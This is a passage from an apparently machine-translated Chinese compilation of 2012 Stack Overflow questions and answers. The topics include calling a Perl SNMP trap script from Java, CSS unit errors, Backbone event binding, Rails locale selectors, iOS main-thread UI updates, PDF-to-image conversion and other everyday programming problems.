   my $result = $session->snmpv2_trap(
                      -varbindlist     => \@varbinds
   );

   $session->close();   

   print " SNMP Trap Hostname   -> $hostnode\n";
   for (my $i;$i <= $#varbinds;$i++)
   {
       print "\n\t\t$varbinds[$i], $varbinds[($i+1)],$varbinds[($i+2)]";
       $i += 2;
   } 
```

我使用这个命令调用这个脚本 perl snmptrap.pl -h myhost "my snmpMsg now"

其中 myhost 是期待我的 snmp 陷阱的远程主机

当我调用这个 perl 脚本时，远程主机正确接收到 snmp 消息。

当我尝试在 java 类中调用这个 perl 脚本时，问题就来了。

我使用的代码如下所示。

```
 String SNMPMSG  = "\"my snmpMsg now\" ";
  String script_url = "./snmptrap.pl "+" -h myhost "+SNMPMSG;
  Process p = Runtime.getRuntime().exec(script_url);

  InputStream stdin= p.getInputStream();
  BufferedReader reader = new BufferedReader (new InputStreamReader(stdin));
  while ((line = reader.readLine ()) != null) {
     System.out.println(" " + line);
  } 
```

奇怪的是，这个 myhost 期望 snmp 消息会根据其空格截断消息，并作为 3 条消息接收。

1 我的
2.snmpMsg
3.now

如果我使用带有非空格的消息 - 例如（my_snmpMsg_now），它将作为一条消息接收

我对 perl 脚本非常陌生，由于基础设施相关问题，我无法使用 java 实现 snmp 陷阱发送过程，需要使用 perl 脚本并使用 java 调用它。

尝试使用转义字符传递消息字符串也可以。

非常感谢这方面的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:44:00.237

你应该这样编码：

```
 String SNMPMSG  = "my snmpMsg now";
  String[] commandAndArgs = new String[]{
          "./snmptrap.pl",
          "-h",
          "myhost", 
          SNMPMSG
  };
  Process p = Runtime.getRuntime().exec(commandAndArgs); 
```

您当前执行此操作的方式的问题在于消息周围的引号（使其成为 Perl 命令的单个参数）是一种 shell 主义。该`exec(String)`方法不理解引号。相反，它只是将命令字符串拆分为包含空格字符的“参数”。结果是 Perl 命令看到错误数量的参数，以及带有无关引号字符的参数。

# css - Firefox 中未显示 CSS 填充/边距

> ID：10862897
> 
> 赞同：-2
> 
> 时间：2012-06-02T14:01:08.910
> 
> 标签：css

我的 CSS 中有以下`div`CSS。

```
.floating {
        width: 500px;
        position: relative;     
        border:2px solid;
        border-radius:5px;
    -moz-border-radius:5px; /* Firefox 3.6 and earlier */
    background-color: #000000;
/*      margin-top: 50 px; */
/*      margin-left: 80px; */
/*      margin-right: 750px; */
/*      margin-right: 100 px; */
    padding: 10 px;
} 
```

它在启用边距（现已禁用）的 Chrome 中显示良好，但 Firefox 根本无法识别边距。Firebug 显示了 CSS，但没有任何边距标签。我通过用父容器中的填充替换边距来快速解决这个问题，从而解决了这个问题。

但是，我现在看到填充也没有显示。如果我在 Firebug 中手动添加填充参数，它会显示得很好。我在这里想念什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T14:17:54.187

两个问题...

1.  `floating`没有正确定义或定位任何东西。没有这样的 HTML 实体称为`floating`. 如果它是一个类名，它需要是`.floating`，如果它是一个元素`id`，它需要是`#floating`。

2.  单位不得包含前面的空格。应该是`10px`，**不是** `10 px`。您似乎在几个地方都犯了同样的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T14:11:48.857

在您的类定义中，类名（“浮动”）缺少“。” 在它之前。像素数和单位之间也不应该有空格。换句话说，“10px”，而不是“10 px”。

# backbone.js - 事件触发时 el 未定义

> ID：10862907
> 
> 赞同：0
> 
> 时间：2012-06-02T14:02:31.420
> 
> 标签：backbone.js, backbone-events, backbone-views

我从这样的一个视图触发一个事件：

```
select: function () {
    // Shorthand for the application namespace
    var app = brickpile.app;
    // Trigger the selected event
    app.trigger('selected', this.model);
} 
```

并绑定到另一个视图中的同一事件：

```
initialize: function () {
    // Shorthand for the application namespace
    var app = brickpile.app;
    // bind to the selected event
    app.bind('selected', this.selected);
}, 
```

在我的函数中，我得到了当前实例的 el 属性？

```
selected: function (model) {
    // find the input hidden located in this views el
    $(this.el)... // is undefined
}, 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T08:26:15.033

我会引用[Backbone FAQ](http://documentcloud.github.com/backbone/#FAQ-this)来回答你的问题

> **绑定“这个”**
> 
> 也许最常见的 JavaScript “陷阱”是这样一个事实，即当您将函数作为回调传递时，它的 this 值会丢失。使用 Backbone，在处理事件和回调时，您通常会发现依赖 Underscore.js 中的 _.bind 和 _.bindAll 很有用。
> 
> 将回调绑定到 Backbone 事件时，您可以选择传递可选的第三个参数来指定稍后调用回调时将使用的 this。

尝试

```
app.bind('selected', this.selected, this); 
```

或者

```
_.bindAll(this, 'selected');
app.bind('selected', this.selected); 
```

# asp.net - 默认情况下正在触发 Facebook openId 集成按钮单击事件

> ID：10862908
> 
> 赞同：-2
> 
> 时间：2012-06-02T14:02:35.430
> 
> 标签：asp.net, facebook, facebook-graph-api, openid

我在我的一个 asp.net 网站上使用了 facebook 打开 id 按钮。默认情况下，当我按下回车键时，此按钮的事件被调用。我不知道如何使它失去焦点。我非常努力。我还有其他按钮需要在默认输入键上触发并使用 asp 面板。我的代码在这里请建议我如何使它失去焦点..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-08T15:28:42.800

由于您没有列出任何代码，我会猜测。

听起来您在使用[默认按钮](https://stackoverflow.com/questions/1473388/asp-net-canceling-the-default-submit-button)时遇到的问题比 OpenID 集成更多。尝试该链接的几种方法来取消提交/默认按钮行为。

# ruby-on-rails - rails形式的界面语言选择器？

> ID：10862910
> 
> 赞同：1
> 
> 时间：2012-06-02T14:02:40.860
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms, internationalization, locale

继续在表单中下拉区域设置选择的方法是什么？

我有一个包含“lng”列的用户模型，其中存储了“en”、“fr”等 i18n 语言环境字符串。

我的目标是在下拉列表中列出所有语言“英语”、“法语”，并在表单更新时将正确的“en”、“fr”值存储在用户表中。

有什么方法可以解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T18:31:24.693

您可以简单地使用选择标签[http://guides.rubyonrails.org/form_helpers.html#the-select-and-option-tags](http://guides.rubyonrails.org/form_helpers.html#the-select-and-option-tags)：

```
= form_for @user do |f|
  = f.select :lng, options_for_select([['English', 'en'], ['French', 'fr']], @user.lng) 
```

我还建议将数组移动到常量的某个位置。例如，在它自己的模型 User 方法中。例如：

```
#models/user.rb
def self.lng_list
  [['English', 'en'], ['French', 'fr']]
end

#form
= form_for @user do |f|
  = f.select :lng, options_for_select(User.lng_list, @user.lng) 
```

*已编辑*

在简单的形式中，您可以使用像这样[https://github.com/plataformatec/simple_form#wrapping-rails-form-helpers](https://github.com/plataformatec/simple_form#wrapping-rails-form-helpers)的 Rails 表单助手：

```
 = f.input :lng do
   = f.select :lng, options_for_select(User.lng_list, @user.lng) 
```

或者您可以使用`collection`选项[https://github.com/plataformatec/simple_form#collections](https://github.com/plataformatec/simple_form#collections)：

```
= f.input :lng, :collection => User.lng_list 
```

# multithreading - 通过共享内存进行通信的两个进程中的多线程会大大降低速度，然后核心映射将其恢复

> ID：10862911
> 
> 赞同：3
> 
> 时间：2012-06-02T14:03:01.787
> 
> 标签：multithreading, ipc, multicore, shared-memory

我有一个 java 进程和一个 C++ 进程通过共享内存段相互通信（使用 jni 进行 java 端通信）。如果在 java 中有 1 个线程，在 C++ 中有 1 个线程，则代码运行速度不错，但是一旦我在进程中使用多个线程，性能就会下降很多（几乎是 100 倍）。

在此之后，我在代码中调整了一些东西（我在我的 core2duo 系统上运行）并发现当我将 java 进程映射到一个内核上时说 core0 和 core1 上的 cpp 进程（使用 sched_affinity()）性能恢复回来。

为什么会这样？我认为问题可能是共享内存段上的缓存争用，但是，这个核心映射提高了性能。此外，仅当使用多个线程时才会观察到该行为。如果在两个进程中都使用单个线程，则速度是正常的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-06T09:34:58.567

当您有两个线程全速运行时，“最佳”配置是每个线程都有一个核心。如果它们没有四处移动，即每个线程都停留在“它的”核心上，那么与它们在核心之间来回移动相比，您将获得更好的性能。因此，基本上 2+2 线程解决方案将需要 4 个内核才能以最佳方式运行。

此外，由于两个内核运行相同的代码，因此它们（在您的情况下）不会从“它们的”内核中移出，这一点至关重要。这是因为两个内核的操作环境或多或少相同，这使得它们之间的切换（在缓存级别）比您需要将所有内容加载到不同的内核时更不麻烦。

然后你有内存系统饱和的问题。“正常”的单线程程序通常会用尽大部分可用内存带宽（如果不是全部的话）。它的速度通常取决于内存系统向它提供数据的速率。有一些例外情况，例如当您在除法指令中时没有发生内存活动，或者当您处于不需要数据读取或写入的紧密循环中时。在大多数其他情况下，内存系统将竭尽全力将内存推入程序，并且很多时候不如程序可以使用它的速度快。

不考虑这一点的程序将在多线程中运行比单线程慢，因为两个线程在需要内存访问时会开始冲突，这会大大减慢速度。这适用于已编译的语言，例如 C 或 C++。在 Java 中，有大量的内存访问在幕后进行（由引擎引起），程序员几乎无法控制这些访问。因此，Java 引擎及其工作将消耗大量缓存内存和带宽，这意味着您的共享内存将与引擎的需求竞争，并且或多或少地不断进出缓存。

我的两分钱。

# ios - 使用后台线程从 url 加载注释。在移动或缩放 mapView 之前，引脚不显示

> ID：10862914
> 
> 赞同：2
> 
> 时间：2012-06-02T14:03:45.837
> 
> 标签：ios, xcode, multithreading, annotations, android-mapview

我使用后台线程从 url 加载注释。在我移动或缩放 mapView 之前，图钉不显示。如何更新我的视图？

我的 viewDidAppear

```
- (void)viewDidAppear:(BOOL)animated
{

[super viewDidAppear:animated];

//Create the thread 
[NSThread detachNewThreadSelector:@selector(loadPList) toTarget:self withObject:nil];

} 
```

加载PList

```
- (void) loadPList { //Load the plist NSString *urlStr = [[NSString alloc] initWithFormat:@"http://www.domain.com/data.xml"];

NSURL *url = [NSURL URLWithString:urlStr]; NSDictionary *dict = [[NSDictionary alloc] initWithContentsOfURL:url];

NSMutableArray *annotations = [[NSMutableArray alloc]init];

NSArray *annotationsOnMap = mapView.annotations; if ([annotationsOnMap count] > [annotations count]) { [mapView removeAnnotations:annotationsOnMap];

} else { //Do nothing }

if ([[NSUserDefaults standardUserDefaults] boolForKey:@"blackKey"]) {

NSArray *ann = [dict objectForKey:@"Category1"];

for(int i = 0; i < [ann count]; i++) {

    NSString *coordinates = [[ann objectAtIndex:i] objectForKey:@"Coordinates"];

    double realLatitude = [[[coordinates componentsSeparatedByString:@","] objectAtIndex:1] doubleValue];
    double realLongitude = [[[coordinates componentsSeparatedByString:@","] objectAtIndex:0] doubleValue];

    MyAnnotation *myAnnotation = [[MyAnnotation alloc] init];
    CLLocationCoordinate2D theCoordinate;
    theCoordinate.latitude = realLatitude;
    theCoordinate.longitude = realLongitude;

    myAnnotation.coordinate=CLLocationCoordinate2DMake(realLatitude,realLongitude);

    myAnnotation.title = [[ann objectAtIndex:i] objectForKey:@"Name"];
    myAnnotation.subtitle = [[ann objectAtIndex:i] objectForKey:@"Address"];
    myAnnotation.icon = [[ann objectAtIndex:0] objectForKey:@"Icon"];

    [mapView addAnnotation:myAnnotation];
    [annotations addObject:myAnnotation];

}
}

else { //Do nothing }

//And same with other categories....

//Update the ui dispatch_async(dispatch_get_main_queue(), ^{

}); } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T14:15:35.973

您正在从非 UI 更新 UI - 线程这将不起作用

您将不得不调用在 UIThread 块中更新您的 ui 的代码段，如下所示：

例如

```
[mapView removeAnnotations:annotationsOnMap]; 
```

必须在 UI-Thread 中调用

```
 dispatch_async(dispatch_get_main_queue(), ^{
        //Update UI if you have to
        [mapView removeAnnotations:annotationsOnMap];
    }); 
```

请注意，您必须在 main_queue 线程中调用所有 UI 更新

```
 dispatch_async(dispatch_get_main_queue(), ^{
        //All UI updating code must come here
    }); 
```

# .net - 检索具有 CLSID 的组件的 COM 类工厂

> ID：10862916
> 
> 赞同：0
> 
> 时间：2012-06-02T14:03:53.487
> 
> 标签：.net, windows, winforms, interop, c#-2.0

当我尝试在 Windows 应用程序中保存交易时，我正在关注弹出消息框

> 您的应用程序中发生了未处理的异常。如果您单击继续，应用程序将忽略此错误并尝试继续。如果您单击退出，应用程序将立即关闭。
> 
> 由于以下错误，检索具有 CLSID {7E4A7632-4A0C-BAB6-AO7DACOA765B} 的组件的 COM 类工厂失败：80040154

请注意，我已经在 x86 环境中构建了我的应用程序，并且我的 windows 应用程序也安装在 windows xp 32 位机器上。

在我的代码中，上面的 clsid 用于作为 com 组件并转换为互操作程序集的类。

请让我知道如何在已安装的机器上解决相同的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T14:44:59.483

我认为误解是关于互操作程序集的作用。您说“转换为”，但事实并非如此。互操作只是 .Net 和 COM 之间所需的粘合剂，就像 .Net 类和函数声明一样。它没有做任何实际工作——函数调用最终需要进入 COM 库，必须正确安装和注册。

# actionscript-3 - 访问链接属性未定义的影片剪辑

> ID：10862919
> 
> 赞同：0
> 
> 时间：2012-06-02T14:04:23.960
> 
> 标签：actionscript-3

这仅在 Windows 中发生，在 osx flash 播放器中不发生。对于我使用链接通过动作脚本添加的库中的大多数影片剪辑，我得到了未定义的属性（参考错误 1065）。我正在创建新实例，所以我不知道为什么会这样。除了创建链接名称之外，我应该做些什么吗？

我还应该提到，我正在将库中的影片剪辑添加到我的影片剪辑类中。

这可能是我的课程不在正确的地方的问题吗？我注意到没有使用但具有链接名称的影片剪辑会引发错误。

当我尝试导出为 .app 或 .exe 时，它​​给了我这个错误：没有库被链接为运行时共享库

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T20:23:44.427

事实证明，使用 TFL 类型的文本字段会导致这些奇怪的错误。我刚刚将它们切换到经典，一切又开始工作了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T23:04:18.883

尝试使用 getDefinitionByName("linkage")

或者尝试创建一个全新的文件，问题将得到解决

# r - 将小矩阵粘贴到大矩阵中的所有可能矩阵

> ID：10862920
> 
> 赞同：0
> 
> 时间：2012-06-02T14:04:26.973
> 
> 标签：r, list

给定一个矩阵 M 和具有不同可能值的较小矩阵，我试图列出将这些小矩阵的组合叠加到矩阵 M 中产生的所有可能矩阵。小矩阵将插入到 M 具有相同行/列的位置名字。

例如，说有：

```
 M <- matrix(rep(0, 49), nrow =7, ncol =7)
 rownames(M) <- colnames(M) <-seq(1,7)
 > M
 1 2 3 4 5 6 7
 1 0 0 0 0 0 0 0
 2 0 0 0 0 0 0 0
 3 0 0 0 0 0 0 0
 4 0 0 0 0 0 0 0
 5 0 0 0 0 0 0 0
 6 0 0 0 0 0 0 0
 7 0 0 0 0 0 0 0

# Generate first set of small matrices:
sub_mat_1_1 <- matrix(rep(1, 9), nrow =3, ncol =3)
rownames(sub_mat_1_1) <- colnames(sub_mat_1_1) <- c(2,3,5)
sub_mat_1_2 <- matrix(rep(2, 9), nrow =3, ncol =3)
rownames(sub_mat_1_2) <- colnames(sub_mat_1_2) <- c(2,3,5)
sub_mat_1_3 <- matrix(rep(3, 9), nrow =3, ncol =3)
rownames(sub_mat_1_3) <- colnames(sub_mat_1_3) <- c(2,3,5)
submatrix_1 <- list(sub_mat_1_1, sub_mat_1_2, sub_mat_1_3)

# Generate second set of small matrices:
submatrix_2 <- list()
sub_mat_2_1 <- matrix(rep(1, 4), nrow =2, ncol =2)
rownames(sub_mat_2_1) <- colnames(sub_mat_2_1) <- c(1,6)
sub_mat_2_2 <- matrix(rep(2, 4), nrow =2, ncol =2)
rownames(sub_mat_2_2) <- colnames(sub_mat_2_2) <- c(1,6)
submatrix_2 <- list(sub_mat_2_1, sub_mat_2_2)

# Generate list of small matrices:
submatrices <- list()
submatrices[[1]] <- submatrix_1
submatrices[[2]] <- submatrix_2

[[1]]
[[1]][[1]]
  2 3 5
2 1 1 1
3 1 1 1
5 1 1 1

[[1]][[2]]
  2 3 5
2 2 2 2
3 2 2 2
5 2 2 2

[[1]][[3]]
  2 3 5
2 3 3 3
3 3 3 3
5 3 3 3

[[2]]
[[2]][[1]]
  1 6
1 1 1
6 1 1

[[2]][[2]]
  1 6
1 2 2
6 2 2 
```

由于第一个小矩阵集有 3 种可能性，第二个有 2 种可能性，我试图在不使用 for 循环的情况下输出所有 6 个可能的矩阵作为列表：

```
[[1]]
  1 2 3 4 5 6 7
1 1 0 0 0 0 1 0
2 0 1 1 0 1 0 0
3 0 1 1 0 1 0 0
4 0 0 0 0 0 0 0
5 0 1 1 0 1 0 0
6 1 0 0 0 0 1 0
7 0 0 0 0 0 0 0

[[2]]
  1 2 3 4 5 6 7
1 1 0 0 0 0 1 0
2 0 2 2 0 2 0 0
3 0 2 2 0 2 0 0
4 0 0 0 0 0 0 0
5 0 2 2 0 2 0 0
6 1 0 0 0 0 1 0
7 0 0 0 0 0 0 0

[[3]]
  1 2 3 4 5 6 7
1 1 0 0 0 0 1 0
2 0 3 3 0 3 0 0
3 0 3 3 0 3 0 0
4 0 0 0 0 0 0 0
5 0 3 3 0 3 0 0
6 1 0 0 0 0 1 0
7 0 0 0 0 0 0 0

[[4]]
  1 2 3 4 5 6 7
1 2 0 0 0 0 2 0
2 0 1 1 0 1 0 0
3 0 1 1 0 1 0 0
4 0 0 0 0 0 0 0
5 0 1 1 0 1 0 0
6 2 0 0 0 0 2 0
7 0 0 0 0 0 0 0

[[5]]
  1 2 3 4 5 6 7
1 2 0 0 0 0 2 0
2 0 2 2 0 2 0 0
3 0 2 2 0 2 0 0
4 0 0 0 0 0 0 0
5 0 2 2 0 2 0 0
6 2 0 0 0 0 2 0
7 0 0 0 0 0 0 0

[[6]]
  1 2 3 4 5 6 7
1 2 0 0 0 0 2 0
2 0 3 3 0 3 0 0
3 0 3 3 0 3 0 0
4 0 0 0 0 0 0 0
5 0 3 3 0 3 0 0
6 2 0 0 0 0 2 0
7 0 0 0 0 0 0 0 
```

一般来说，我可能有 n 个给定的“小矩阵列表”，每个都有自己的矩阵数量。在这种情况下，我将如何使用应用类型函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T12:25:01.153

这给出了请求的输出，但我必须同意评论者的观点，即问题不是很好。您如何定义插入子矩阵的值的位置？我只是假设您希望将它们插入到特定的行和列子集中，如您请求的输出中所示...

将两个矩阵插入指定行/列的函数`M`（全局定义，可能是不好的做法）

```
tmpmatf <- function(m1,m2,rc1=c(2,3,5),rc2=c(1,6)) {
    pos1 <- as.matrix(expand.grid(rc1,rc1))
    pos2 <- as.matrix(expand.grid(rc2,rc2))
    M[pos1] <- m1
    M[pos2] <- m2
    M
} 
```

现在使用`expand.grid`从每个子矩阵列表中创建一个包含所有索引组合的数据框，并使用`alply`(array-to-list) from在每个组合`plyr`上运行：`tmpmatf`

```
library(plyr)
alply(expand.grid(seq(length(submatrices[[1]])),
                  seq(length(submatrices[[2]]))),
      1,
      function(x) {
          tmpmatf(submatrices[[1]][[x[[1]]]],submatrices[[2]][[x[[2]]]])
      }) 
```

这应该适用于您的两个子矩阵列表中的任意数量的子矩阵，但是如果您确实有更多（> 2）个子矩阵列表，那么您没有给我们足够的信息来指定（例如）第三个列表子矩阵应该粘贴到更大的矩阵中......

请注意，此部分的第一部分（通过双列矩阵使用矩阵索引）比使用`for`循环将单个元素插入矩阵要快得多，但第二部分（`alply`）实际上并不比（任何？）快一对`for`迭代所有组合的嵌套循环——在这种情况下，后者可能更清晰/更容易调试......

# java - GAE JDO - 建模这些关系的正确方法是什么？

> ID：10862924
> 
> 赞同：0
> 
> 时间：2012-06-02T14:05:02.417
> 
> 标签：java, google-app-engine, google-cloud-datastore, jdo, datanucleus

在设置我的模型/实体时，我真的想打破我的 RDBMS 思维定势。我非常注重性能，所以我想把这件事做好。我需要建模三个不同的东西：

事件 - 发生在某个日期，有邀请人参加，有与之关联的帖子

Person - 有一个字符串 id，有一个名字

发布 - 一个人将为事件发布帖子。我需要保持发布帖子的人与发布帖子的事件之间的关联。

我的第一个想法是去类似的东西

```
class Event
    @PrimaryKey
    Long id;
    List<Key> personList;
    List<Key> postList;
    String name;

class Post
    @PrimaryKey
    Key id;
    String details;
    Key personWhoPosted;

class Person
    @PrimaryKey
    Key id;
    String fbId;
    String name; 
```

应用程序的主要查询加载与给定人员关联的所有事件。

我已经完全实现了这种方法，但是一旦数据库开始填充来自我的 beta 测试人员的适量数据，加载主列表的操作就会变慢，因为发生了如此多的 QUERY 和 GET。对于每个事件，我都必须为帖子进行另一组查询/获取。对于每个帖子，我必须为与之关联的人进行一系列其他查询/获取，依此类推。

我将此视频用作主要参考： [http ://www.youtube.com/watch?v=AgaL6NGpkB8&list=WLB3249928DA0FA4AF&feature=mh_lolz](http://www.youtube.com/watch?v=AgaL6NGpkB8&list=WLB3249928DA0FA4AF&feature=mh_lolz)

建立这些关系的最佳方式是什么？我正在考虑将所有内容展平到 Event 中，以最大限度地减少对一个查询和一组并行获取的初始负载。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-24T13:28:10.677

没有在此处发布我的完整更新模型，我用来“使其正确”的两个驱动因素是：使用正确的键类型，以及使用列表属性将索引建模到数据中。这是我为此找到的两个很好的参考资料：

澄清实体键的类型： [https ://developers.google.com/appengine/docs/java/datastore/jdo/creatinggettinganddeletingdata#Keys](https://developers.google.com/appengine/docs/java/datastore/jdo/creatinggettinganddeletingdata#Keys)

列出属性作为检索数据的高效和高性能方式：http: [//novyden.blogspot.com/2011/02/efficient-keyword-search-with-relation.html](http://novyden.blogspot.com/2011/02/efficient-keyword-search-with-relation.html)

# java - 从 pdf 的字节数组中获取 pdf 的第一页作为图像

> ID：10862928
> 
> 赞同：1
> 
> 时间：2012-06-02T14:05:40.693
> 
> 标签：java, image, bytearray, itext, pdf-reader

我正在获取 pdf 文件`byte array`。我只想将 pdf 的第一页转换为`image`.

我已经厌倦了`com.lowagie.text.pdf`以下提供的课程 -

```
PdfReader reader = new PdfReader(input);
reader.selectPages("1");
File file = new File("D:/img1.jpg");
BufferedImage pdfImage = ImageIO.read(new ByteArrayInputStream(reader.getPageContent(1)));
ImageIO.write(pdfImage, "jpg", file); 
```

这样做会在`ImageIO.write`调用时给我一个异常？当我获取 reader.getPageContent(1) 返回的字节数组的大小时，我得到一个 1000+ 的值。令我困惑的是为什么我会得到异常。

例外 -

```
java.lang.IllegalArgumentException: image == null! 
```

我也尝试了itext，但没有用。

你能建议我从pdf文件的字节数组中获取第一页的图像（第一页作为图像）吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:43:40.683

据我所知，这对于 iText 是不可能的（至少前一段时间我搜索了一个类似的问题）。

但是您可以使用来自[Apache PDFBox的](http://pdfbox.apache.org/)[PDFToImage](http://pdfbox.apache.org/commandlineutilities/PDFToImage.html)：

```
String [] args =  new String[7];
args[0] = "-startPage";
args[1] = "1";
args[2] = "-endPage";
args[3] = "1";
args[4] = "-outputPrefix";
args[5] = "MyJpgFile";
args[6] = "MyPdfFile";

PDFToImage.main(args); 
```

为此编写一个包装器很容易。与此同时，PDFBox 中可能提供了这样的包装器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T16:02:00.480

回答我自己的问题，以便其他人可以从中受益。经过一番研究，我找到了它并得到了解决方案。

看看这个[链接](https://code.google.com/p/do-pdf/)。

```
PDFDocumentReader document = new PDFDocumentReader(<byteArraOfThePDF>);
PageDetail pageDetail = new PageDetail("<docIDanything>", "", <pagenumber>, "");
ResourceDetail det = document.getPageAsImage(pageDetail);

BufferedImage image = ImageIO.read(new ByteArrayInputStream(det.getBytes()));
File file = new File("d:/img2.jpg");
ImageIO.write(image, "jpg", file); 
```

# ruby-on-rails - 用 Perl 和 Ruby 编写应用程序？

> ID：10862930
> 
> 赞同：3
> 
> 时间：2012-06-02T14:05:47.703
> 
> 标签：ruby-on-rails, perl

我正在开发一个主要是 Ruby on Rails 的项目。但是，我需要在这个项目中生成和解析 Excel 文件（我知道，我知道......），所以我一直在使用 Perl 的 Spreadsheet::WriteExcel 和 Spreadsheet::ParseExcel 效果很好。但是，将这种 Perl 的使用与更大的 Ruby on Rails 应用程序结合起来的最佳方式是什么？用反引号调用 Perl 脚本是否符合犹太教规？对我来说这感觉有点 hacky，但如果这是唯一（或最好）的方式，那么这就是我要做的。我想联系一下，看看是否有其他人有任何建议或建议。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T14:11:16.423

还有[电子表格 gem](http://rubygems.org/gems/spreadsheet)，虽然我从来没有用它来写作。

我不认为使用反引号或 有任何本质上的错误`%x()`，尽管我可能会将 Perl 的东西公开为服务以使其更通用。不过，可能有点矫枉过正。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-03T02:31:56.913

[您可能会考虑使用 Perl webapp 框架（如Mojolicious](http://mojolicio.us)）制作一个简单的 RESTful 应用程序。您的 RoR 应用程序可以简单地调用 Perl 应用程序并返回一些 JSON。

这是一个非常简单的应用程序，你当然`get_data`会做一些事情，我只是让它返回一个简单的哈希。安装 Mojolicious 后，您可以使用其内置服务器之一运行它，例如：（当然`morbo myapp.pl`，假设以下内容已保存`myapp.pl`）

```
#!/usr/bin/env perl
use Mojolicious::Lite;

get '/:query' => sub {
  my $self = shift;
  my $query = $self->param( 'query' );
  my $data = get_data( $query );
  $self->render( json => $data );
};

app->start;

sub get_data {
  my $query = shift;
  # do something here, like parse some excel file
  # I will just make some silly data
  my $data = { $query => $query };
  return $data;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-03T04:33:47.323

我不知道它支持多少第三方的东西，但是有[ruby​​-perl](https://github.com/zephirworks/ruby-perl)项目：在 Ruby 中嵌入 Perl。

# jquery - 从jquery播放框架处理json（使用gson）

> ID：10862935
> 
> 赞同：-2
> 
> 时间：2012-06-02T14:06:48.037
> 
> 标签：jquery, json, playframework, gson

我正在尝试使用 jquery 将以下内容发送到播放框架（1.2.3）中的控制器：

```
[{"name":"username","value":"abc"},{"name":"fullname","value":"abc def"},
{"name":"email","value":"abc@def.com"},{"name":"password","value":"111222"},
{"name":"password2","value":"111222"}] 
```

在我的 play 1.2.3 控制器（我正在尝试使用 gson）中，我尝试使用`JsonElement/Object/Array`as 参数，但控制器内部总是为 null `JsonObject/ELement/Array`- 不确定这是否是正确的方法。欢迎任何建议或更好的处理方式（我更愿意从 jquery 发送 json - 在播放中处理它以进行处理）。

```
public static void testForm(JsonObject json) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:08:52.360

如果那是您正在使用的确切 json 字符串，则您缺少数组的结束标记，请`]`尝试将其添加到末尾。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-04T07:47:46.757

你如何发送你的 json 以及如何在你的控制器中获取它？json 没有自动绑定，所以你必须明确

```
MyObject myObject = new GsonBuilder().create().fromJson(request.params.get("myObject"); 
```

# eclipse - Eclipse：下一个单词快捷方式不区分大小写

> ID：10862945
> 
> 赞同：3
> 
> 时间：2012-06-02T14:08:32.243
> 
> 标签：eclipse, keyboard-shortcuts

我使用了很多 CTRL + 箭头来跳转到 Eclipse 中的下一个单词。但它区分大小写，我不希望它以驼峰形式出现。有没有办法制作不区分大小写的单词导航快捷方式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T14:12:25.730

这在这里得到了回答：[Configure Eclipse word-boundaries so 'Next-Word-Key' skips whole identifier](https://stackoverflow.com/questions/4399102/configure-eclipse-word-boundaries-so-next-word-key-skips-whole-identifier)

取消选择选项：首选项/Java/编辑器/Java 名称中的智能插入符号定位。

请注意，您必须为您使用的每种语言类型执行此操作。因此，对于 javascript 文件，取消选择选项：Preferences / Javascript / Editor / Smart caret 定位在 JavaScript 名称中。

# r - R中哈希和列表之间的区别

> ID：10862954
> 
> 赞同：5
> 
> 时间：2012-06-02T14:10:28.857
> 
> 标签：r, list, hash

在 R 中，我发现列表是有用的结构（如 Python 中的字典）。我偶然发现了`hash`似乎提供非常相似功能的软件包。

列表和散列之间是否存在任何实际差异，使一个比另一个更受欢迎？（除了列表是基础的一部分）

我希望这不是太开放，但不确定如何缩小范围。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T15:26:52.480

从`hash`文档中：

> 通过参考。环境和散列是 R 中的特殊对象，因为全局只存在一个副本。当作为函数的参数提供时，不会进行本地复制，并且对函数中散列的任何更改都会全局反映。
> 
> 表现。哈希基于环境，旨在使用环境内部哈希表非常快速。对于小型数据结构，列表几乎在所有情况下都优于散列。对于较大的数据结构，即>100-1000 个键值对，散列的性能变得更快。除此之外，散列的性能远远优于原生列表。

# html - Internet Explorer 8 不正确地显示搜索表单

> ID：10862960
> 
> 赞同：0
> 
> 时间：2012-06-02T14:11:46.613
> 
> 标签：html, css, forms, internet-explorer-8

使用 IE 8，我的搜索表单无法正确显示。输入字段太低。在 Firefox、Chrome 和 Safari 中，一切正常。

![IE 8 中的搜索表单](../Images/fad651a5955c1b5f8129c6de5f6b03b7.png)

![Chromium 中的搜索表单](../Images/b6fbe49114e02a61f9fc4ef8249fd7fa.png)

这是我的 HTML：

```
<form class="search" role="search" method="get" id="searchform" action="<?php echo home_url( '/' ); ?>">
<input type="text" placeholder="Suchen..." name="s" id="s" />
<input type="submit" id="searchsubmit" value="Start" />
</form> 
```

这是我的 CSS：

```
.search {
background: #F3F4F3;
padding: 10px;
width: auto;
color: #666;
font-size: 11px;
line-height: 1.3em;
padding-top: 10px;
margin-bottom: 20px;
margin-top: 0px; 
```

}

```
input {
color:#fff;
border:1px solid #B3B5B3;
background:transparent;
outline:none;
height:21px;
padding:0;
margin: 0;
padding: 0px 8px;
font-family: $std-sans-font; 
```

}

```
input[type="text"] {
color: #515b57; 
```

}

```
:-moz-placeholder {
color:#515b57; 
```

}

```
